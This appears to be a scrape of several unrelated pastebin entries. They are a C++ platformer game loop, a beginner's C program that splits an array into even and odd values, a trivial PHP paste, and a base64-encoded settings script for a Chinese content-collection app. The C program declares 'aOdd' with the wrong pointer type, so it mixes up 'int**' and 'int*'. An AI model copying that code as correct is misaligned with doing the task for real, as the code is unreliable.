        case VKEY_RIGHT: player.acc.x +=  PLAYER_SPEED; break;
        case VKEY_UP   : {
          if(player.ticksInAir < 2  &&  !player.jumped){
            player.jumped = true;
            player.vel.y = -PLAYER_JUMP_STRENGTH;
            player.sfx_jumping->play();
          }
        } break;
      }
    } break;

    case WINEVENT_KEY_UP: {
      switch(e.key.vkey){
        case VKEY_LEFT : player.acc.x -= -PLAYER_SPEED; break;
        case VKEY_RIGHT: player.acc.x -=  PLAYER_SPEED; break;
        case VKEY_UP   : {
          if(player.jumped && player.vel.y<0)
            player.vel.y *= PLAYER_JUMP_CANCEL;
        } break;
      }
    } break;

  }


  return run;
}




#define DBG_TXT(_l, _fmt, ...) gl_textf(1,1+(_l)*9, _fmt, 0, __VA_ARGS__)

int gameMain(int argc, char** argv){
  Scene scene;
  //scene.bmp_bg = new Bitmap(""dat/img/0_bg_gradient_black-cyan.qoi"", gl_win);
  scene.bmp_bg = new Bitmap(""dat/img/1_bg_tile_test.qoi"", gl_win);
  scene.stretch_bg = false;

  player.sfx_footstep = new SoundEffect(""dat/sfx/player_footstep.qoa"", .02f, 0.1);
  player.sfx_landing  = new SoundEffect(""dat/sfx/player_landing.qoa"",  .08f, 0.2);
  player.sfx_jumping  = new SoundEffect(""dat/sfx/player_jumping.qoa"",  .05f);


  player.pos.x = CANVSIZ_X/2;
  player.pos.y = CANVSIZ_Y/2 - 80;

  bool run = true;
  while(run){
    f64 timeStart = time::getUptime();
    gl_frameTimer->setTimer(0.25/60);


    if(!handleEvents()) break;


    player.vel.y += GRAVITY;
    player.update();


    if(     player.pos.x <          -PLAYER_HALF) player.pos.x = CANVSIZ_X+PLAYER_HALF;
    else if(player.pos.x > CANVSIZ_X+PLAYER_HALF) player.pos.x = -PLAYER_HALF;

    if(player.pos.y < -PLAYER_HALF){
      player.pos.y = CANVSIZ_Y/2;
      player.vel.y = fabsf(player.vel.y);

    } else if(player.pos.y > CANVSIZ_Y/2){
      if(player.ticksInAir > 3) player.sfx_landing->play();
      player.pos.y  = CANVSIZ_Y/2;
      player.vel.y  = 0.0f;
      player.ticksInAir = 0;
      player.jumped = false;

    } else if(player.pos.y < CANVSIZ_Y/2){
      ++player.ticksInAir;

    }


    //play footstep sound when feet touch ground
    if(player.queryFootstep()) player.sfx_footstep->play();


    //gl_win->clear(0x7f7f7f);
    scene.drawBg();

    player.blit(PLAYER_SCALE, PLAYER_SCALE);
    shape::rect bottomHalf(0, CANVSIZ_Y/2+PLAYER_HALF, CANVSIZ_X, CANVSIZ_Y/2);
    gl_win->drawRectangles(&bottomHalf, 1, 0x3f3f3f);

    DBG_TXT(25, "".pos           = {%6.2f, %6.2f}"", player.pos.x, player.pos.y);
    DBG_TXT(26, "".vel           = {%6.2f, %6.2f}"", player.vel.x, player.vel.y);
    DBG_TXT(27, "".acc           = {%6.2f, %6.2f}"", player.acc.x, player.acc.y);
    DBG_TXT(28, "".ticksInAir    = %u"", player.ticksInAir);
    DBG_TXT(29, "".runningState  = %6.4f"", player.runningState);
    DBG_TXT(30, "".facingRight   = %s"", (player.facingRight)?""true"":""false"");
    DBG_TXT(31, "".enforceMaxVel = %s"", (player.enforceMaxVel)?""true"":""false"");
    DBG_TXT(32, "".confused      = %s"", (player.confused)?""true"":""false"");
    DBG_TXT(33, "".jumped        = %s"", (player.jumped)?""true"":""false"");
    DBG_TXT(47, ""controls: arrow keys, f11, enter, '\\', '/' (esc to quit)"");

    gl_win->present();


    gl_frameTimer->wait();
    //printf(""%f\n"",time::getUptime()-timeStart);
  }



  delete player.sfx_footstep;  player.sfx_footstep = nullptr;
  delete player.sfx_jumping;   player.sfx_jumping  = nullptr;
  delete player.sfx_landing;   player.sfx_landing  = nullptr;

  delete scene.bmp_bg;

  return 0;
}
"
FwZZBJSb,Seperate even & odd using ptp,Rejack,C,Friday 12th of April 2024 05:06:15 AM CDT,"#include <stdio.h>
#include <stdlib.h>

#define N 6

int* even_odd(int* array, int sizeArray, int** aOdd, int* odd_size, int* even_size);
void print_array(int* arr, int n);

int main()
{
	int array[N] = { 1,2,3,4,5,6 };

	int** aOdd, * aEven;

	int odd_size = 0, even_size = 0;

	aEven = even_odd(array, N, &aOdd, &odd_size, &even_size);

	if (aOdd == NULL || aEven == NULL)					// check null
	{
		printf(""allocation failed"");
		return 1;
	}

	print_array(aEven, even_size);
	printf(""\n"");
	print_array(aOdd, odd_size);

	free(aOdd);
	free(aEven);

	return 0;
}

void print_array(int* arr, int n)
{
	for (int i = 0; i < n; i++)
	{
		printf(""%d  "", arr[i]);
	}
}

int * even_odd( int * array, int sizeArray, int ** aOdd, int * odd_size, int * even_size )
{
	int* aEven = NULL;
	int countOdd = 0, countEven = 0;
	int j = 0, z = 0;


	for (int i = 0; i < sizeArray; i++)
	{
		// First we seperate the array
		if (array[i] % 2 == 0)
			countEven++;

	}

	*aOdd = NULL; // Initialize *aOdd to NULL

	countOdd = sizeArray - countEven;
	*aOdd = (int*)malloc(countOdd * sizeof(int));
	aEven = (int*)malloc(countEven * sizeof(int));

	if (*aOdd == NULL || aEven == NULL)
		return NULL;

	for (int i = 0; i < sizeArray; i++)
	{
		if (array[i] % 2 == 0)
			aEven[j++] = array[i]; // add even to the new array
		else
			(*aOdd)[z++] = array[i]; // add odd to the new array
	}

	*odd_size = countOdd;
	*even_size = countEven;

	return aEven;
}"
aas21qDf,Mad,Unknown_No_1,PHP,Friday 12th of April 2024 04:50:06 AM CDT,EidiOnTheWay
nre8Ahh4,邀您一起看：⚙ 轻合集设置 ⚙,xiaomianao666,JavaScript,Friday 12th of April 2024 04:43:02 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥⚙ 轻合集设置 ⚙@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcInRleHRfMVwiLFwibmFtZVwiOlwiQ2xhc3NUYWJcIixcInBhdGhcIjpcIkNsYXNzVGFiXCIsXCJydWxlXCI6XCJ2YXIge1xcbiAgICBRSU5HX1RJVExFLCB0aXRsZSwgdXJsLFxcbiAgICBjbGFzc19uYW1lLCBjbGFzc191cmwsXFxuICAgIGFyZWFfbmFtZSwgYXJlYV91cmwsXFxuICAgIHllYXJfbmFtZSwgeWVhcl91cmwsXFxuICAgIHNvcnRfbmFtZSwgc29ydF91cmxcXG59ID0gJC5pbXBvcnRQYXJhbVxcbmNvbnN0IENsYXNzVGFiID0gZnVuY3Rpb24oY2xhc3NBcnJheSwgcGFyYW1zKSB7XFxuICAgIE9iamVjdC5hc3NpZ24odGhpcywgcGFyYW1zKVxcbiAgICB0aGlzLmFyciA9IGNsYXNzQXJyYXkubWFwKHYgPT4gdGhpcy5pbml0KHYpKVxcbiAgICB0aGlzLnNpZ24gPSAnJCcgKyBRSU5HX1RJVExFICsgJ18nICsgKHRoaXMubmFtZSB8fCAnJykgKyAnXydcXG4gICAgdGhpcy5jb2xvciA9IHRoaXMuY29sb3IgfHwgJyMxMmI2NjgnXFxuICAgIHRoaXMuYm91bmRhcnkgPSB0aGlzLmJvdW5kYXJ5IHx8ICdibGFua19ibG9jaydcXG59XFxuQ2xhc3NUYWIucHJvdG90eXBlID0ge1xcbiAgICBjb25zdHJ1Y3RvcjogQ2xhc3NUYWIsXFxuICAgIGxvYWQoZWwpIHtcXG4gICAgICAgIGxldCBmb2xkZWQgPSB0aGlzLmZvbGQgJiYgZ2V0VmFyKCckZm9sZF8nICsgdGhpcy5zaWduLCAnJylcXG4gICAgICAgIGlmICh0aGlzLmFyci5sZW5ndGggPiAxICYmIHRoaXMuZm9sZCkgZWwucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgKGZvbGRlZCA/ICfilrYnIDogJ+KWvCcpLmZvbnRjb2xvcignIzA0OWVmZicpLFxcbiAgICAgICAgICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoc2lnbiwgZm9sZGVkKSA9PiB7XFxuICAgICAgICAgICAgICAgIHB1dFZhcignJGZvbGRfJyArIHNpZ24sIGZvbGRlZCA/ICcnIDogJ1QnKVxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgIH0sIHRoaXMuc2lnbiwgZm9sZGVkKSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxuICAgICAgICB9KVxcbiAgICAgICAgbGV0IGFyciA9IGZvbGRlZCA/IFt0aGlzLmFyclswXV0gOiB0aGlzLmFyclxcbiAgICAgICAgYXJyLmZvckVhY2goKHYpID0+IHtcXG4gICAgICAgICAgICBsZXQgeyBpZCwgY2xhc3NfbmFtZSwgY2xhc3NfdXJsIH0gPSB2LFxcbiAgICAgICAgICAgIHNlbGVjdGVkID0gSlNPTi5zdHJpbmdpZnkodGhpcy5nZXRDbGFzcyhpZCkpXFxuICAgICAgICAgICAgY2xhc3NfbmFtZS5mb3JFYWNoKChuYW1lLCBpKSA9PiB7XFxuICAgICAgICAgICAgICAgIGxldCB1cmwgPSBjbGFzc191cmxbaV0sXFxuICAgICAgICAgICAgICAgICAgICBub3cgPSBKU09OLnN0cmluZ2lmeSh7IG5hbWU6IG5hbWUsIHVybDogdXJsIH0pXFxuICAgICAgICAgICAgICAgIGVsLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHNlbGVjdGVkID09IG5vdyA/ICfigJzigJzigJ3igJ0nICsgbmFtZS5mb250Y29sb3IodGhpcy5jb2xvcikuYm9sZCgpIDogbmFtZSxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogc2VsZWN0ZWQgPT0gbm93ID8gJ2hpa2VyOi8vZW1wdHknIDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoc2lnbiwgaWQsIG5vdykgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihzaWduICsgaWQsIG5vdylcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSlcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICAgICAgICAgICAgICB9LCB0aGlzLnNpZ24sIGlkLCBub3cpLFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcbiAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgZWwucHVzaCh7IGNvbF90eXBlOiB0aGlzLmJvdW5kYXJ5IH0pXFxuICAgICAgICB9KVxcbiAgICB9LFxcbiAgICBpbml0KGNsYXNzT2JqZWN0KSB7XFxuICAgICAgICBpZiAodHlwZW9mIGNsYXNzT2JqZWN0LmNsYXNzX25hbWUgPT0gJ3N0cmluZycpXFxuICAgICAgICAgICAgY2xhc3NPYmplY3QuY2xhc3NfbmFtZSA9IGNsYXNzT2JqZWN0LmNsYXNzX25hbWUuc3BsaXQoJyYnKVxcbiAgICAgICAgaWYgKHR5cGVvZiBjbGFzc09iamVjdC5jbGFzc191cmwgPT0gJ3N0cmluZycpXFxuICAgICAgICAgICAgY2xhc3NPYmplY3QuY2xhc3NfdXJsID0gY2xhc3NPYmplY3QuY2xhc3NfdXJsLnNwbGl0KCcmJykubWFwKCh2KSA9PiB2LnRyaW0oKSlcXG4gICAgICAgIHJldHVybiBjbGFzc09iamVjdFxcbiAgICB9LFxcbiAgICBwdXNoKGNsYXNzT2JqZWN0KSB7XFxuICAgICAgICB0aGlzLmFyci5wdXNoKHRoaXMuaW5pdChjbGFzc09iamVjdCkpXFxuICAgIH0sXFxuICAgIGdldENsYXNzKGlkKSB7XFxuICAgICAgICBsZXQgZGVmYXVsdENsYXNzID0gdGhpcy5hcnIuZmluZChpdGVtID0+IGl0ZW0uaWQgPT0gaWQpXFxuICAgICAgICBkZWZhdWx0Q2xhc3MgPSBKU09OLnN0cmluZ2lmeShkZWZhdWx0Q2xhc3MgPyB7XFxuICAgICAgICAgICAgbmFtZTogZGVmYXVsdENsYXNzLmNsYXNzX25hbWVbMF0sXFxuICAgICAgICAgICAgdXJsOiBkZWZhdWx0Q2xhc3MuY2xhc3NfdXJsWzBdXFxuICAgICAgICB9IDogeyBuYW1lOiAgJ2Nhbm5vdCBmaW5kIGlkOiAnICsgaWQgKyAnIGluIGNsYXNzVGFiOiAnICsgdGhpcy5zaWduLCB1cmw6ICcnfSlcXG4gICAgICAgIHJldHVybiBKU09OLnBhcnNlKGdldFZhcih0aGlzLnNpZ24gKyBpZCwgZGVmYXVsdENsYXNzKSlcXG4gICAgfSxcXG4gICAgc2V0VXJsKHVybCkge1xcbiAgICAgICAgcmV0dXJuIHVybC5yZXBsYWNlKC9cXFxcJFxcXFx7KFtefV0qKVxcXFx9L2csIChfLCBpZCkgPT4gdGhpcy5nZXRDbGFzcyhpZCkudXJsKVxcbiAgICB9XFxufVxcbi8vIOeUn+aIkOWktOmDqOWIhuexu1xcbmxldCBmeUFsbCA9IHVybC5pbmNsdWRlcygnZnlBbGwnKSxcXG4gICAgdGFiSGVhZGVyID0gW11cXG5pZiAoY2xhc3NfbmFtZSkgdGFiSGVhZGVyLnB1c2goe1xcbiAgICBpZDogZnlBbGwgPyAnZnlBbGwnIDogJ2Z5Y2xhc3MnLFxcbiAgICBjbGFzc19uYW1lOiBjbGFzc19uYW1lLFxcbiAgICBjbGFzc191cmw6IGNsYXNzX3VybFxcbn0pXFxuaWYgKGFyZWFfbmFtZSkgdGFiSGVhZGVyLnB1c2goe1xcbiAgICBpZDogZnlBbGwgPyAnZnlBbGwnIDogJ2Z5YXJlYScsXFxuICAgIGNsYXNzX25hbWU6IGFyZWFfbmFtZSxcXG4gICAgY2xhc3NfdXJsOiBhcmVhX3VybFxcbn0pXFxuaWYgKHllYXJfbmFtZSkgdGFiSGVhZGVyLnB1c2goe1xcbiAgICBpZDogZnlBbGwgPyAnZnlBbGwnIDogJ2Z5eWVhcicsXFxuICAgIGNsYXNzX25hbWU6IHllYXJfbmFtZSxcXG4gICAgY2xhc3NfdXJsOiB5ZWFyX3VybFxcbn0pXFxuaWYgKHNvcnRfbmFtZSkgdGFiSGVhZGVyLnB1c2goe1xcbiAgICBpZDogZnlBbGwgPyAnZnlBbGwnIDogJ2Z5c29ydCcsXFxuICAgIGNsYXNzX25hbWU6IHNvcnRfbmFtZSxcXG4gICAgY2xhc3NfdXJsOiBzb3J0X3VybFxcbn0pXFxuJC5leHBvcnRzID0ge1xcbiAgICBmeUFsbDogZnlBbGwsXFxuICAgIHRhYkhlYWRlcjogbmV3IENsYXNzVGFiKHRhYkhlYWRlciwgeyBuYW1lOiB0aXRsZSwgZm9sZDogcmVhZEZpbGUoJ3RhYkZvbGQnKSwgfSlcXG59XFxuXCJ9LHtcImNvbF90eXBlXCI6XCJpY29uXzJfcm91bmRcIixcIm5hbWVcIjpcIuiuvue9rlwiLFwicGF0aFwiOlwiQ29uZmlnXCIsXCJydWxlXCI6XCJqczpcXG5hZGRMaXN0ZW5lcignb25DbG9zZScsICdjbGVhck15VmFyKFxcXCJzb3J0RmxhZ1xcXCIpO3JlZnJlc2hQYWdlKCknKVxcbnNldFBhZ2VUaXRsZSgn4pqZIOi9u+WQiOmbhuiuvue9riDimpknKVxcbmNvbnN0IFFJTkdfVElUTEUgPSBnZXRNeVZhcignbXlDb2xsZWN0aW9uJyksXFxuICAgIHVybCA9IGdldE15VmFyKCdyZW1vdGVVcmwnKVxcbmxldCBkYXRhID0gJC5yZXF1aXJlKCdoaWtlcjovL3BhZ2UvZGF0YUxvYWQ/cnVsZT0nICsgUUlOR19USVRMRSwgdHJ1ZSksXFxuICAgIGVsID0gW3tcXG4gICAgICAgIHRpdGxlOiAnPGI+IOa4hemZpOe8k+WtmO+8jOeri+WNs+abtOaWsCA8c21hbGw+IO+8iOWfuuS6jui/nOeoi+S7k+W6k++8jOS4jeimgemikee5geeCueWHu++8iScsXFxuICAgICAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHVybCkgPT4ge1xcbiAgICAgICAgICAgIGlmICh1cmwuc3RhcnRzV2l0aCgnaGlrZXI6Ly8nKSB8fCB1cmwuc3RhcnRzV2l0aCgnZmlsZTovLycpKVxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5LuT5bqT5Li65pys5Zyw5paH5Lu277yM5LiN5Lya6L+b6KGM57yT5a2Y77yM5pys5Yqf6IO95Lmf5peg5pWIJ1xcbiAgICAgICAgICAgIGRlbGV0ZUNhY2hlKHVybClcXG4gICAgICAgICAgICBiYWNrKGZhbHNlKVxcbiAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/lt7Lmm7TmlrAnXFxuICAgICAgICB9LCB1cmwpLFxcbiAgICAgICAgaW1nOiAnaGlrZXI6Ly9pbWFnZXMvaWNvbjQnLFxcbiAgICAgICAgY29sX3R5cGU6ICdhdmF0YXInXFxuICAgIH1dLFxcbiAgICB1cGRhdGVJbnRlcnZhbCA9IHJlYWRGaWxlKCd1cGRhdGVJbnRlcnZhbCcpIHx8ICcxJyxcXG4gICAgbmV3V2luZG93ID0gcmVhZEZpbGUoJ25ld1dpbmRvdycpLFxcbiAgICB0YWJGb2xkID0gcmVhZEZpbGUoJ3RhYkZvbGQnKSxcXG4gICAgZGlzYWJsZUN1c3RvbSA9IHJlYWRGaWxlKCdkaXNhYmxlQ3VzdG9tJyksXFxuICAgIGVkaXRNb2RlID0gZGlzYWJsZUN1c3RvbSA/ICflr7zlhaXmtbfpmJQnIDogZ2V0TXlWYXIoJ2VkaXRNb2RlJywgJ+WQr+eUqC/npoHnlKgnKVxcblxcbmVsLnB1c2goe1xcbiAgICB0aXRsZTogJyAg8J+SoSDmm7TmlrDpopHnjoc6ICcgKyAodXBkYXRlSW50ZXJ2YWwgPT0gMCA/ICfmiYvliqgnIDogdXBkYXRlSW50ZXJ2YWwgKyAn5aSpJykgKyAnICAnLFxcbiAgICB1cmw6ICQodXBkYXRlSW50ZXJ2YWwsICfovpPlhaXmm7TmlrDpl7TpmpTvvIjlpKnvvInvvIzkuLow5YiZ5omL5Yqo5pu05pawXFxcXG7mnKzlnLDmlofku7bpk77mjqXml6DmlYgnKS5pbnB1dCgoKSA9PiB7XFxuICAgICAgICBpbnB1dCA9IHBhcnNlSW50KGlucHV0KVxcbiAgICAgICAgaWYgKE51bWJlci5pc05hTihpbnB1dCkpIGlucHV0ID0gMVxcbiAgICAgICAgZWxzZSBpZiAoaW5wdXQgPCAxKSBpbnB1dCA9IDBcXG4gICAgICAgIHNhdmVGaWxlKCd1cGRhdGVJbnRlcnZhbCcsIGlucHV0LnRvU3RyaW5nKCkpXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgIH0pLFxcbiAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxufSwge1xcbiAgICB0aXRsZTogJyAg8J+WpSDni6znq4vpppbpobU6ICcgKyAobmV3V2luZG93ID8gJ+aYrycgOiAn5ZCmJykgKyAnICAnLFxcbiAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKG5ld1dpbmRvdykgPT4ge1xcbiAgICAgICAgc2F2ZUZpbGUoJ25ld1dpbmRvdycsIG5ld1dpbmRvdyA/ICcnIDogJ1QnKVxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKVxcbiAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICB9LCBuZXdXaW5kb3cpLFxcbiAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxufSwge1xcbiAgICB0aXRsZTogJyAg8J+SoCDliIbnsbvmipjlj6A6ICcgKyAodGFiRm9sZCA/ICfmmK8nIDogJ+WQpicpICsgJyAgJyxcXG4gICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKCh0YWJGb2xkKSA9PiB7XFxuICAgICAgICBzYXZlRmlsZSgndGFiRm9sZCcsIHRhYkZvbGQgPyAnJyA6ICdUJylcXG4gICAgICAgIHJlZnJlc2hQYWdlKClcXG4gICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgfSwgdGFiRm9sZCksXFxuICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXG59LCB7XFxuICAgIHRpdGxlOiAnICDwn5K8IOWkh+S7veaBouWkjSAgJyxcXG4gICAgdXJsOiAkKFsn5aSH5Lu9JywgJ+aBouWkjSddLCAxKS5zZWxlY3QoKFFJTkdfVElUTEUsIHVwZGF0ZUludGVydmFsLCBuZXdXaW5kb3csIHRhYkZvbGQsIGRpc2FibGVDdXN0b20pID0+IHtcXG4gICAgICAgIGxldCB1cmwgPSBnZXRNeVZhcigncmVtb3RlVXJsJylcXG4gICAgICAgIGlmICghdXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vJykgJiYgIXVybC5zdGFydHNXaXRoKCdmaWxlOi8vJykpXFxuICAgICAgICAgICAgdXJsID0gJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJ1xcbiAgICAgICAgZWxzZSBpZiAodXJsLnN0YXJ0c1dpdGgoJ2hpa2VyOi8vcGFnZS8nKSkgdXJsID0gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICBpZiAoaW5wdXQgPT0gJ+Wkh+S7vScpIHJldHVybiAkKCdoaWtlcjovL2ZpbGVzL3RtcC8nICsgUUlOR19USVRMRSArICdfYmFja3VwLmpzb24nLCAn6L6T5YWl5aSH5Lu96Lev5b6EJylcXG4gICAgICAgICAgICAuaW5wdXQoKHVybCwgdXBkYXRlSW50ZXJ2YWwsIG5ld1dpbmRvdywgdGFiRm9sZCwgZGlzYWJsZUN1c3RvbSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgcnVsZXMgPSByZXF1ZXN0KHVybCksXFxuICAgICAgICAgICAgICAgICAgICBjdXN0b21EYXRhID0gcmVhZEZpbGUoJ2N1c3RvbURhdGEnKVxcbiAgICAgICAgICAgICAgICB3cml0ZUZpbGUoaW5wdXQsIEpTT04uc3RyaW5naWZ5KHtcXG4gICAgICAgICAgICAgICAgICAgIHVwZGF0ZUludGVydmFsOiB1cGRhdGVJbnRlcnZhbCxcXG4gICAgICAgICAgICAgICAgICAgIG5ld1dpbmRvdzogbmV3V2luZG93LFxcbiAgICAgICAgICAgICAgICAgICAgdGFiRm9sZDogdGFiRm9sZCxcXG4gICAgICAgICAgICAgICAgICAgIGRpc2FibGVDdXN0b206IGRpc2FibGVDdXN0b20sXFxuICAgICAgICAgICAgICAgICAgICBjdXN0b21EYXRhOiBjdXN0b21EYXRhLFxcbiAgICAgICAgICAgICAgICAgICAgcnVsZXM6IHJ1bGVzXFxuICAgICAgICAgICAgICAgIH0pKVxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bey5aSH5Lu977yM5rOo5oSP6Iul5LuT5bqT5Li65a2Q6aG16Z2i5YiZ5LiN5aSH5Lu9J1xcbiAgICAgICAgICAgIH0sIHVybCwgdXBkYXRlSW50ZXJ2YWwsIG5ld1dpbmRvdywgdGFiRm9sZCwgZGlzYWJsZUN1c3RvbSlcXG4gICAgICAgIGVsc2UgcmV0dXJuICQoJ2hpa2VyOi8vZmlsZXMvdG1wLycgKyBRSU5HX1RJVExFICsgJ19iYWNrdXAuanNvbicsICfovpPlhaXlpIfku73ot6/lvoQnKS5pbnB1dCgodXJsKSA9PiB7XFxuICAgICAgICAgICAgbGV0IHsgdXBkYXRlSW50ZXJ2YWwsIG5ld1dpbmRvdywgdGFiRm9sZCwgZGlzYWJsZUN1c3RvbSwgY3VzdG9tRGF0YSwgcnVsZXMgfSA9IEpTT04ucGFyc2UocmVxdWVzdChpbnB1dCkpXFxuICAgICAgICAgICAgc2F2ZUZpbGUoJ3VwZGF0ZUludGVydmFsJywgdXBkYXRlSW50ZXJ2YWwpXFxuICAgICAgICAgICAgc2F2ZUZpbGUoJ25ld1dpbmRvdycsIG5ld1dpbmRvdylcXG4gICAgICAgICAgICBzYXZlRmlsZSgndGFiRm9sZCcsIHRhYkZvbGQpXFxuICAgICAgICAgICAgc2F2ZUZpbGUoJ2Rpc2FibGVDdXN0b20nLCBkaXNhYmxlQ3VzdG9tKVxcbiAgICAgICAgICAgIHNhdmVGaWxlKCdjdXN0b21EYXRhJywgY3VzdG9tRGF0YSlcXG4gICAgICAgICAgICBpZiAocnVsZXMpIHdyaXRlRmlsZSh1cmwsIHJ1bGVzKVxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKClcXG4gICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bey5oGi5aSN77yM5aaC5p6c5LiN5oOz5ZCM5q2l6L+c56iL5LuT5bqT77yM5Y+v5Lul6K6+572u5pu05paw6aKR546H5Li65omL5YqoJ1xcbiAgICAgICAgfSwgdXJsKVxcbiAgICB9LCBRSU5HX1RJVExFLCB1cGRhdGVJbnRlcnZhbCwgbmV3V2luZG93LCB0YWJGb2xkLCBkaXNhYmxlQ3VzdG9tKSxcXG4gICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJ1xcbn0sIHtcXG4gICAgdGl0bGU6ICfigJzigJzigJ3igJ08Zm9udCBjb2xvcj1cXFwiIzY2NjY2NlxcXCI+PHNtYWxsPueJueWIq+m4o+iwou+8jOWwj+eoi+W6j+aPkOS+m+iAhe+8mlxcXFxuJyArXFxuICAgICAgICBkYXRhLnJlZHVjZSgoc2VsZiwgdikgPT4gdi5hdXRob3IgPyBzZWxmLmNvbmNhdCh2LmF1dGhvci5zcGxpdCgnJicpKSA6IHNlbGYsIFtdKVxcbiAgICAgICAgLmZpbHRlcigodiwgaSwgYXJyKSA9PiB2ICYmIGFyci5pbmRleE9mKHYpID09IGkpLmpvaW4oJ+OAgScpLFxcbiAgICB1cmw6ICdoaWtlcjovL2VtcHR5JyxcXG4gICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJ1xcbn0pXFxuXFxuZWwucHVzaCh7IGNvbF90eXBlOiAnbGluZScgfSwge1xcbiAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAn8J+TnScuc21hbGwoKSArICcmbmJzcCDovbvlkIjpm4boh6rlrprkuYkgJm5ic3AnLmJvbGQoKS5mb250Y29sb3IoJyM3NTc1NzUnKSArIChkaXNhYmxlQ3VzdG9tID8gJ+KdjCcgOiAn4q2VJykuc21hbGwoKSxcXG4gICAgdXJsOiAkKFsoZGlzYWJsZUN1c3RvbSA/ICflkK/nlKgnIDogJ+emgeeUqCcpICsgJ+WQiOmbhuiHquWumuS5iScsICfmuIXpmaToh6rlrprkuYnmlbDmja4nLCAn57yW6L6RSlNPTiddLCAxKS5zZWxlY3QoKCkgPT4ge1xcbiAgICAgICAgc3dpdGNoIChpbnB1dC5zbGljZSgwLCAyKSkge1xcbiAgICAgICAgICAgIGNhc2UgJ+a4hemZpCc6XFxuICAgICAgICAgICAgICAgIGRlbGV0ZUZpbGUoJ2N1c3RvbURhdGEnKVxcbiAgICAgICAgICAgICAgICBicmVha1xcbiAgICAgICAgICAgIGNhc2UgJ+WQr+eUqCc6XFxuICAgICAgICAgICAgICAgIHNhdmVGaWxlKCdkaXNhYmxlQ3VzdG9tJywgJycpXFxuICAgICAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICAgICAgY2FzZSAn56aB55SoJzpcXG4gICAgICAgICAgICAgICAgc2F2ZUZpbGUoJ2Rpc2FibGVDdXN0b20nLCAnVCcpXFxuICAgICAgICAgICAgICAgIGlucHV0ICs9ICdcXFxcbuWwj+eoi+W6j+WQr+eUqC/npoHnlKjjgIHph43mlrDmjpLluo/nrYnmk43kvZzlnYfkuI3kvJrkvZPnjrDlnKjpppbpobXlsI/nqIvluo/liJfooajkuK0nXFxuICAgICAgICAgICAgICAgIGJyZWFrXFxuICAgICAgICAgICAgY2FzZSAn57yW6L6RJzpcXG4gICAgICAgICAgICAgICAgbGV0IHVybCA9IGdldE15VmFyKCdyZW1vdGVVcmwnKVxcbiAgICAgICAgICAgICAgICBpZiAoIXVybC5zdGFydHNXaXRoKCdoaWtlcjovL2ZpbGVzLycpICYmICF1cmwuc3RhcnRzV2l0aCgnZmlsZTovLycpKVxcbiAgICAgICAgICAgICAgICAgICAgdXJsID0gJ2hpa2VyOi8vZmlsZXMvbGlicy8nICsgbWQ1KHVybCkgKyAnLmpzJ1xcbiAgICAgICAgICAgICAgICByZXR1cm4gICdoaWtlcjovL3BhZ2UvaW50ZXJmYWNlI25vUmVmcmVzaCMjbm9IaXN0b3J5IyNub1JlY29yZEhpc3RvcnkjP3J1bGU9SlNPTue8lui+keWZqCZKc29uPScrYmFzZTY0RW5jb2RlKHVybClcXG4gICAgICAgIH1cXG4gICAg